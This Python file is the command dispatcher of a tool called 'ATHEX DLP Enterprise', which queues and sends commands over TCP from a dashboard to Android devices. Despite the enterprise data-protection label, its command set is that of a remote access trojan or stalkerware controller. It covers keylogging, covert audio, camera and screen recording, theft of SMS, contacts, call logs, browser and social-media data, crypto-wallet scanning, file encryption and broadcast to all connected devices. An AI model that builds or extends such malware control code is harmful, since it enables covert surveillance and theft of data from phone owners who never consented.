"""
ATHEX DLP Enterprise - Command Dispatcher
==========================================
Routes commands between web dashboard and Android devices.
Handles command parsing, validation, queuing, and execution.
"""

import json
import logging
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional, Callable, Any
from enum import Enum

logger = logging.getLogger(__name__)


class CommandType(Enum):
    """Supported command types"""
    # Device Info
    GET_DEVICE_INFO = "GET_DEVICE_INFO"
    
    # Contacts
    GET_CONTACTS = "GET_CONTACTS"
    
    # SMS
    GET_SMS = "GET_SMS"
    SEND_SMS = "SEND_SMS"
    
    # Calls
    GET_CALL_LOGS = "GET_CALL_LOGS"
    
    # Files
    LIST_FILES = "LIST_FILES"
    DOWNLOAD_FILE = "DOWNLOAD_FILE"
    DELETE_FILE = "DELETE_FILE"
    MODIFY_FILE = "MODIFY_FILE"
    UPLOAD_FILE = "UPLOAD_FILE"
    
    # Location
    GET_LOCATION = "GET_LOCATION"
    START_TRACKING = "START_TRACKING"
    STOP_TRACKING = "STOP_TRACKING"
    
    # Camera
    TAKE_PHOTO = "TAKE_PHOTO"
    RECORD_VIDEO = "RECORD_VIDEO"
    
    # Microphone
    RECORD_AUDIO = "RECORD_AUDIO"
    STOP_AUDIO = "STOP_AUDIO"
    
    # Notifications
    GET_NOTIFICATIONS = "GET_NOTIFICATIONS"
    
    # Clipboard
    GET_CLIPBOARD = "GET_CLIPBOARD"
    SET_CLIPBOARD = "SET_CLIPBOARD"
    
    # Apps
    GET_APPS = "GET_APPS"
    LAUNCH_APP = "LAUNCH_APP"
    UNINSTALL_APP = "UNINSTALL_APP"
    
    # WiFi
    GET_WIFI = "GET_WIFI"
    SCAN_WIFI = "SCAN_WIFI"
    
    # Browser
    GET_BROWSER_DATA = "GET_BROWSER_DATA"
    
    # Social Media
    GET_SOCIAL_DATA = "GET_SOCIAL_DATA"
    
    # Crypto
    SCAN_CRYPTO = "SCAN_CRYPTO"
    
    # Screen
    SCREENSHOT = "SCREENSHOT"
    START_RECORDING = "START_RECORDING"
    STOP_RECORDING = "STOP_RECORDING"
    
    # Encryption
    ENCRYPT_FILE = "ENCRYPT_FILE"
    DECRYPT_FILE = "DECRYPT_FILE"
    
    # Keylogger
    START_KEYLOGGER = "START_KEYLOGGER"
    STOP_KEYLOGGER = "STOP_KEYLOGGER"
    
    # System
    PING = "PING"
    RESTART = "RESTART"
    SHUTDOWN = "SHUTDOWN"


class CommandStatus(Enum):
    """Command execution status"""
    PENDING = "pending"
    SENT = "sent"
    EXECUTING = "executing"
    COMPLETED = "completed"
    FAILED = "failed"
    TIMEOUT = "timeout"
    CANCELLED = "cancelled"


class Command:
    """Represents a single command to be executed"""
    
    def __init__(self, 
                 command_id: str,
                 command_type: CommandType,
                 target_session: str,
                 params: Dict = None,
                 timeout: int = 30):
        self.command_id = command_id
        self.command_type = command_type
        self.target_session = target_session
        self.params = params or {}
        self.timeout = timeout
        
        self.status = CommandStatus.PENDING
        self.created_at = datetime.now()
        self.sent_at: Optional[datetime] = None
        self.completed_at: Optional[datetime] = None
        self.result: Any = None
        self.error: Optional[str] = None
        self.attempts = 0
        self.max_attempts = 3
    
    def to_dict(self) -> Dict:
        return {
            "command_id": self.command_id,
            "type": self.command_type.value,
            "target": self.target_session,
            "params": self.params,
            "status": self.status.value,
            "created_at": self.created_at.isoformat(),
            "sent_at": self.sent_at.isoformat() if self.sent_at else None,
            "completed_at": self.completed_at.isoformat() if self.completed_at else None,
            "result": self.result,
            "error": self.error
        }
    
    def to_raw_string(self) -> str:
        """Convert command to raw string for TCP transmission"""
        return f"{self.command_type.value}|{json.dumps(self.params)}"


class CommandDispatcher:
    """
    Routes commands between dashboard and devices.
    
    Features:
    - Command validation
    - Command queuing
    - Timeout handling
    - Retry logic
    - Command history
    - Batch commands
    - Priority queuing
    """
    
    def __init__(self, device_manager=None, tcp_server=None):
        """
        Initialize Command Dispatcher.
        
        Args:
            device_manager: DeviceManager instance
            tcp_server: TCPServer instance
        """
        self.device_manager = device_manager
        self.tcp_server = tcp_server
        
        # Command storage
        self.pending_commands: Dict[str, Command] = {}
        self.active_commands: Dict[str, Command] = {}
        self.completed_commands: Dict[str, Command] = {}
        self.command_lock = threading.RLock()
        
        # Command history (max 1000)
        self.command_history: List[Command] = []
        self.max_history = 1000
        
        # Statistics
        self.total_commands = 0
        self.successful_commands = 0
        self.failed_commands = 0
        self.timeout_commands = 0
        
        # Callbacks
        self.on_command_complete: Optional[Callable] = None
        self.on_command_failed: Optional[Callable] = None
        
        # Command counter for IDs
        self._command_counter = 0
        
        # Timeout monitor thread
        self._monitor_thread: Optional[threading.Thread] = None
        self._monitoring = False
        
        logger.info("CommandDispatcher initialized")
    
    def set_device_manager(self, device_manager):
        """Set device manager reference"""
        self.device_manager = device_manager
    
    def set_tcp_server(self, tcp_server):
        """Set TCP server reference"""
        self.tcp_server = tcp_server
    
    def dispatch(self, 
                 command_type: CommandType,
                 target_session: str,
                 params: Dict = None,
                 timeout: int = 30,
                 priority: bool = False) -> Optional[Command]:
        """
        Dispatch a command to a device.
        
        Args:
            command_type: Type of command
            target_session: Target device session ID
            params: Command parameters
            timeout: Command timeout in seconds
            priority: Whether to prioritize this command
            
        Returns:
            Command object or None if failed
        """
        
        # Validate target device
        if self.device_manager:
            device = self.device_manager.get_device(target_session)
            if not device:
                logger.error(f"Device not found: {target_session}")
                return None
            
            if not device.is_online:
                logger.error(f"Device is offline: {target_session}")
                return None
        
        # Generate command ID
        self._command_counter += 1
        command_id = f"cmd_{int(time.time())}_{self._command_counter:04d}"
        
        # Create command
        command = Command(
            command_id=command_id,
            command_type=command_type,
            target_session=target_session,
            params=params,
            timeout=timeout
        )
        
        # Add to pending
        with self.command_lock:
            self.pending_commands[command_id] = command
        
        self.total_commands += 1
        
        # Send via TCP server
        if self.tcp_server:
            raw_command = command.to_raw_string()
            success = self.tcp_server.send_to_client(target_session, raw_command)
            
            if success:
                command.status = CommandStatus.SENT
                command.sent_at = datetime.now()
                command.attempts += 1
                
                # Move to active
                with self.command_lock:
                    if command_id in self.pending_commands:
                        del self.pending_commands[command_id]
                    self.active_commands[command_id] = command
                
                # Add to history
                self._add_to_history(command)
                
                # Start timeout monitor if not running
                if not self._monitoring:
                    self._start_timeout_monitor()
                
                logger.info(f"📤 Command sent: {command_type.value} → {target_session}")
                return command
            else:
                logger.error(f"Failed to send command to {target_session}")
                command.status = CommandStatus.FAILED
                command.error = "Failed to send"
                self.failed_commands += 1
                return None
        else:
            logger.error("TCP server not set")
            return None
    
    def dispatch_batch(self,
                       commands: List[tuple],
                       target_session: str) -> List[Command]:
        """
        Dispatch multiple commands to a device.
        
        Args:
            commands: List of (CommandType, params) tuples
            target_session: Target device session ID
            
        Returns:
            List of Command objects
        """
        results = []
        
        for command_type, params in commands:
            cmd = self.dispatch(command_type, target_session, params)
            if cmd:
                results.append(cmd)
        
        return results
    
    def dispatch_to_all(self,
                        command_type: CommandType,
                        params: Dict = None,
                        online_only: bool = True) -> Dict[str, Command]:
        """
        Broadcast command to all devices.
        
        Args:
            command_type: Type of command
            params: Command parameters
            online_only: Only send to online devices
            
        Returns:
            Dictionary of session_id → Command
        """
        results = {}
        
        if self.device_manager:
            devices = self.device_manager.get_online_devices() if online_only \
                     else self.device_manager.get_all_devices()
            
            for device in devices:
                cmd = self.dispatch(command_type, device.session_id, params)
                if cmd:
                    results[device.session_id] = cmd
        
        return results
    
    def complete_command(self, command_id: str, result: Any = None, error: str = None):
        """
        Mark a command as completed or failed.
        
        Args:
            command_id: Command ID
            result: Command result data
            error: Error message if failed
        """
        with self.command_lock:
            command = self.active_commands.pop(command_id, None)
            
            if not command:
                command = self.pending_commands.pop(command_id, None)
            
            if not command:
                logger.warning(f"Command not found: {command_id}")
                return
            
            command.completed_at = datetime.now()
            
            if error:
                command.status = CommandStatus.FAILED
                command.error = error
                self.failed_commands += 1
                
                if self.on_command_failed:
                    self.on_command_failed(command)
                
                logger.error(f"❌ Command failed: {command.command_type.value} - {error}")
            else:
                command.status = CommandStatus.COMPLETED
                command.result = result
                self.successful_commands += 1
                
                if self.on_command_complete:
                    self.on_command_complete(command)
                
                logger.info(f"✅ Command completed: {command.command_type.value}")
            
            # Store in completed
            self.completed_commands[command_id] = command
    
    def cancel_command(self, command_id: str) -> bool:
        """Cancel a pending or active command"""
        with self.command_lock:
            command = self.pending_commands.pop(command_id, None)
            
            if not command:
                command = self.active_commands.pop(command_id, None)
            
            if command:
                command.status = CommandStatus.CANCELLED
                self.completed_commands[command_id] = command
                logger.info(f"🚫 Command cancelled: {command_id}")
                return True
            
            return False
    
    def get_command(self, command_id: str) -> Optional[Command]:
        """Get command by ID"""
        with self.command_lock:
            return (self.pending_commands.get(command_id) or
                    self.active_commands.get(command_id) or
                    self.completed_commands.get(command_id))
    
    def get_pending_commands(self, session_id: str = None) -> List[Command]:
        """Get pending commands, optionally filtered by session"""
        with self.command_lock:
            if session_id:
                return [c for c in self.pending_commands.values() 
                       if c.target_session == session_id]
            return list(self.pending_commands.values())
    
    def get_active_commands(self, session_id: str = None) -> List[Command]:
        """Get active commands, optionally filtered by session"""
        with self.command_lock:
            if session_id:
                return [c for c in self.active_commands.values() 
                       if c.target_session == session_id]
            return list(self.active_commands.values())
    
    def get_command_history(self, limit: int = 50) -> List[Dict]:
        """Get recent command history"""
        recent = self.command_history[-limit:]
        return [cmd.to_dict() for cmd in reversed(recent)]
    
    def _add_to_history(self, command: Command):
        """Add command to history"""
        self.command_history.append(command)
        
        # Trim history
        while len(self.command_history) > self.max_history:
            self.command_history.pop(0)
    
    def _start_timeout_monitor(self):
        """Start monitoring for command timeouts"""
        self._monitoring = True
        
        self._monitor_thread = threading.Thread(
            target=self._timeout_monitor_loop,
            name="CommandTimeoutMonitor",
            daemon=True
        )
        self._monitor_thread.start()
    
    def _timeout_monitor_loop(self):
        """Monitor active commands for timeouts"""
        while self._monitoring:
            try:
                now = datetime.now()
                timed_out = []
                
                with self.command_lock:
                    for cmd_id, command in list(self.active_commands.items()):
                        if command.sent_at:
                            elapsed = (now - command.sent_at).total_seconds()
                            
                            if elapsed > command.timeout:
                                if command.attempts < command.max_attempts:
                                    # Retry
                                    logger.warning(f"⏱️ Command timeout, retrying: {cmd_id}")
                                    command.attempts += 1
                                    command.sent_at = now
                                    
                                    # Re-send via TCP
                                    if self.tcp_server:
                                        raw = command.to_raw_string()
                                        self.tcp_server.send_to_client(
                                            command.target_session, raw
                                        )
                                else:
                                    # Max retries reached
                                    timed_out.append(cmd_id)
                
                # Mark timed out commands
                for cmd_id in timed_out:
                    self.complete_command(
                        cmd_id, 
                        error=f"Timeout after {command.max_attempts} attempts"
                    )
                    self.timeout_commands += 1
                
                time.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                logger.error(f"Timeout monitor error: {e}")
                time.sleep(5)
    
    def stop_monitor(self):
        """Stop timeout monitor"""
        self._monitoring = False
        if self._monitor_thread:
            self._monitor_thread.join(timeout=5)
    
    def get_stats(self) -> Dict:
        """Get dispatcher statistics"""
        with self.command_lock:
            return {
                "total_commands": self.total_commands,
                "pending": len(self.pending_commands),
                "active": len(self.active_commands),
                "completed": len(self.completed_commands),
                "successful": self.successful_commands,
                "failed": self.failed_commands,
                "timeout": self.timeout_commands,
                "history_size": len(self.command_history)
            }
    
    def get_available_commands(self) -> List[Dict]:
        """Get list of all available commands with descriptions"""
        commands = [
            {"type": "GET_CONTACTS", "description": "Get all contacts", "params": []},
            {"type": "GET_SMS", "description": "Get all SMS messages", "params": ["max_count"]},
            {"type": "SEND_SMS", "description": "Send SMS message", "params": ["number", "message"]},
            {"type": "GET_CALL_LOGS", "description": "Get call history", "params": ["max_count"]},
            {"type": "LIST_FILES", "description": "List files in directory", "params": ["path"]},
            {"type": "DOWNLOAD_FILE", "description": "Download a file", "params": ["path"]},
            {"type": "DELETE_FILE", "description": "Delete a file", "params": ["path"]},
            {"type": "GET_LOCATION", "description": "Get current GPS location", "params": []},
            {"type": "TAKE_PHOTO", "description": "Take photo with camera", "params": ["camera"]},
            {"type": "RECORD_AUDIO", "description": "Record microphone audio", "params": ["duration"]},
            {"type": "SCREENSHOT", "description": "Capture screenshot", "params": ["quality"]},
            {"type": "GET_NOTIFICATIONS", "description": "Get active notifications", "params": []},
            {"type": "GET_CLIPBOARD", "description": "Get clipboard content", "params": []},
            {"type": "GET_APPS", "description": "Get installed apps", "params": ["include_system"]},
            {"type": "SCAN_WIFI", "description": "Scan WiFi networks", "params": []},
            {"type": "ENCRYPT_FILE", "description": "Encrypt a file", "params": ["path", "key"]},
            {"type": "PING", "description": "Ping device to check connection", "params": []},
        ]
        return commands
    
    def shutdown(self):
        """Clean shutdown"""
        self.stop_monitor()
        
        with self.command_lock:
            self.pending_commands.clear()
            self.active_commands.clear()
        
        logger.info("CommandDispatcher shut down")


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    dispatcher = CommandDispatcher()
    
    print("\n📡 Available Commands:")
    for cmd in dispatcher.get_available_commands():
        print(f"  • {cmd['type']}: {cmd['description']}")
    
    print(f"\n Stats: {json.dumps(dispatcher.get_stats(), indent=2)}")